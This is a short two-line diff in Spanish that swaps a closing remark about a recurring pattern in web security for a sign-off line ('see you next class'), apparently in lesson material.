-Ese patrón se repite una y otra vez en seguridad web.
+Nos vemos la próxima clase 🚀
